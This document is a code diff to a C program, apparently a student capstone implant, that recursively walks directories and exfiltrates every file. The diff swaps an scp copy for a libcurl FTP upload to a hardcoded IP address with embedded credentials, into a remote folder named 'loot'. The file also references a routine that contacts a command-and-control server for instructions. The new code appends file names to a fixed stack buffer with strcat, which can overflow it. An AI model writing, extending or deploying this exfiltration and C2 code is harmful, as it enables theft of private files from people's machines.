@@ -4,6 +4,7 @@
 #include <string.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <errno.h>
 
 /* Compilation: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast
  * sudo apt install libcurl4-openssl-dev
@@ -33,7 +34,7 @@
 char * readFile(char * fileName);
 char * takeControlInstruction(void); 
 void Copy(char * rootDirectory);
-void copyContents(char * fileName);
+void copyContents(char * fileName, char * suffix);
 
 // Globals:
 
@@ -78,7 +79,7 @@ void Copy(char * rootDirectory) {
 		if (S_ISREG(path_stat.st_mode)) {			// Detects Files
 			current = fullPath;
 			printf("File: %s\n", current);
-			copyContents(current);
+			copyContents(current, entry->d_name);				// Calling copyContents
 		}
 		else if (S_ISDIR(path_stat.st_mode)) {			// Detects Directories
 			if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
@@ -97,12 +98,50 @@ void Copy(char * rootDirectory) {
 	closedir(dir);
 }
 
-void copyContents(char * fileName) {			// This procedure relies heavily on SCP; problems will be called if it is not installed
+void copyContents(char * fileName, char * suffix) {
 
-	char command[1000];
-	sprintf(command, "scp -P 49999 %s %s", fileName, REMOTEPATH);
-	system(command);
-	printf("Copied %s to remote server\n", fileName);
+	CURL * curl;
+	CURLcode res;
+
+	FILE * srcFile;
+	struct stat fileInfo;
+
+	if (stat(fileName, &fileInfo)) {
+		printf("Could not open %s: %s", fileName, strerror(errno));
+	}
+
+	srcFile = fopen(fileName, "rb");
+
+	curl_global_init(CURL_GLOBAL_ALL);
+	curl = curl_easy_init();
+
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_USERNAME, "test");
+		curl_easy_setopt(curl, CURLOPT_PASSWORD, "capstonepassword");
+
+		char prelimLink[] = "ftp://test:capstonepassword@70.77.131.111:5678/home/itinerant/CONTROLLER/loot/";
+		char * link = strcat(prelimLink, suffix);
+
+		printf("LINK: %s\n", link);
+
+		curl_easy_setopt(curl, CURLOPT_URL, link);			// "ftp://test:capstonepassword@70.77.131.111:5678/home/itinerant/CONTROLLER/loot/"
+
+		curl_easy_setopt(curl, CURLOPT_READDATA, srcFile);
+
+		curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)fileInfo.st_size);
+
+		res = curl_easy_perform(curl);
+
+		if (res != CURLE_OK) {
+			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+		}
+
+		curl_easy_cleanup(curl);
+	}
+
+	fclose(srcFile);
+
+	curl_global_cleanup();
 }
 
 char * takeControlInstruction(void) {			// Contact C2, place directive in file named "tmp"
